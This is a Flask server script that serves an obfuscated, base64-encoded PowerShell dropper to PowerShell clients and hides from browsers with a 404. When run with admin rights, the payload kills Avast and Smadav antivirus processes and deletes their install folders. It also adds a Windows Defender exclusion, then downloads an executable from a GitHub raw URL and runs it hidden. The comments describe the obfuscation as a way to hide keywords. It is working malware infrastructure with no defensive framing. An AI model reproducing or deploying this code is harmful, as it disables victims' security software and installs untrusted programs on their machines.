from flask import Flask, Response, request
import base64
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: 404 for browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404)

    # Obfuscated PowerShell Logic
    # We use variable fragmentation and backticks to hide keywords
    raw_script = """
    

$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tIEpBSUxCUkVBSy0xOiBBQ1RJVkUgLS0t'))) -ForegroundColor Green
    
    # Process killing logic
    $procs = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXZhc3RVSQ=='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXZhc3RTdmM='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U21hZGF2'))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U01BREFW'))))
    foreach ($p in $procs) {
        taskkill /F /IM ($p + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LmV4ZQ==')))) /T /Device 2>$null
    }

    # Folder cleanup logic
    $folders = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcXFByb2dyYW0gRmlsZXNcXEF2YXN0IFNvZnR3YXJl'))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcXFByb2dyYW0gRmlsZXMgKHg4NilcXFNNQURBVg=='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcXFByb2dyYW0gRmlsZXNcXFNNQURBVg=='))))
    foreach ($f in $folders) {
        if (Test-Path $f) {
            Remove-Item -Path $f -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    $path = ($HOME + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFxjbGllbnRfMTAuZXhl'))))
    Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIERlcGxveWluZyBjbGllbnRfMTAuLi4='))) -ForegroundColor Cyan
    try {
        if (!(Test-Path $path)) {
            $web = New-Object System.Net.WebClient
            $web.DownloadFile(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2plbWJleC9Ub3AtRm9sbG93ZXJzL3Jhdy9yZWZzL2hlYWRzL21haW4vY2xpZW50XzEwLmV4ZQ=='))), $path)
        }
        if (Test-Path $path) {
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIEV4ZWN1dGluZy4uLg=='))) -ForegroundColor Green
            Start-Process $path -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WyFdIEVycm9yOiA='))) + $_) -ForegroundColor Red
    }
} else {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tIEFETUlOIFJFUVVJUkVEIC0tLQ=='))) -ForegroundColor Red
}
"""
    # Double-layer scrambling: First fragment, then Base64
    encoded_bytes = base64.b64encode(raw_script.encode('utf-8'))
    scrambled_logic = encoded_bytes.decode('utf-8')
    
    # Final payload that decodes the fragmented script
    ps_payload = f"$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{scrambled_logic}')); iex $s"

    return Response(ps_payload, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
